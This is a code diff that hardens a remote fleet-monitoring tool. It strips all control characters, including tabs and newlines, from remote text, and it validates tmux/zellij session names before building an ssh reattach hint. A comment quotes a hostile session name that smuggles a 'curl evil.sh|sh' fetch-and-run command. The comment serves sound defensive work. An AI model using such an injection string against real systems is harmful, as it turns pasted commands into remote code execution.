@@ -74,14 +74,16 @@ export function extractEnvelope(text) {
 //   - OSC   (incl. window title 0/2, hyperlinks 8, clipboard 52): ESC ] ... BEL|ST | C1 0x9d ... BEL|ST
 //   - CSI   (SGR color codes etc):   ESC [ ... final | C1 0x9b ... final
 //   - bare two-char escapes (ESC c, ESC 7, ESC =, ...)
-//   - C0 controls (excl. TAB/LF), DEL, and any leftover single C1 byte
+//   - C0 controls (incl. TAB/LF/CR), DEL, and any leftover single C1 byte —
+//     all fleet string fields are single-line, so TAB/LF/CR are stripped too
+//     rather than let a hostile field inject fake rows into the fleet table
 // Alternation order matters: the multi-byte sequence forms are tried before
 // the single-byte catch-all so a C1 introducer (e.g. \x9b) consumes its
 // whole sequence instead of being stripped alone and leaking its payload.
 // (The Terminal DiLLMa / Codex-CLI ANSI-injection class.)
 /* eslint-disable no-control-regex */
 const VT_RE =
-  /(?:\x1bP|\x90)[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b[X^_]|[\x98\x9e\x9f])[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b\]|\x9d)[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c)?|(?:\x1b\[|\x9b)[0-9:;<=>?]*[ -/]*[@-~]?|\x1b[ -~]?|[\x00-\x08\x0b-\x1f\x7f\x80-\x9f]/g;
+  /(?:\x1bP|\x90)[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b[X^_]|[\x98\x9e\x9f])[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b\]|\x9d)[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c)?|(?:\x1b\[|\x9b)[0-9:;<=>?]*[ -/]*[@-~]?|\x1b[ -~]?|[\x00-\x1f\x7f\x80-\x9f]/g;
 
 export function stripRemoteText(s, max = 256) {
   if (s == null) return '';
@@ -346,9 +348,20 @@ export async function fetchFleet({ hosts = readHosts(), concurrency = 4, spawnFn
   return merged;
 }
 
+// muxSession is remote-controlled and only control-char-stripped on ingest
+// (stripRemoteText), so shell metacharacters survive into it. The hint below
+// is meant to be pasted into a local shell — unquoted interpolation of a
+// hostile muxSession (e.g. `x'; curl evil.sh|sh; echo '`) would turn a
+// copy-paste hint into local RCE. Session names are always plain tmux/zellij
+// identifiers, so a tight allowlist costs nothing.
+export const MUX_SESSION_RE = /^[A-Za-z0-9_.-]{1,64}$/;
+
 // The local attach hint (src/reap.js: attachHint) wrapped in `ssh -t` so it
-// can be pasted verbatim to reattach on the remote box.
+// can be pasted verbatim to reattach on the remote box. Returns null (no
+// hint) rather than a dangerous string when dest or muxSession don't pass
+// validation — callers must treat null as "omit the attach line".
 export function attachHintRemote(dest, muxName, muxSession) {
+  if (!validHostToken(dest) || typeof muxSession !== 'string' || !MUX_SESSION_RE.test(muxSession)) return null;
   const inner = muxName === 'zellij' ? `zellij attach ${muxSession}` : `tmux new -A -s ${muxSession}`;
   return `ssh -t ${dest} '${inner}'`;
 }
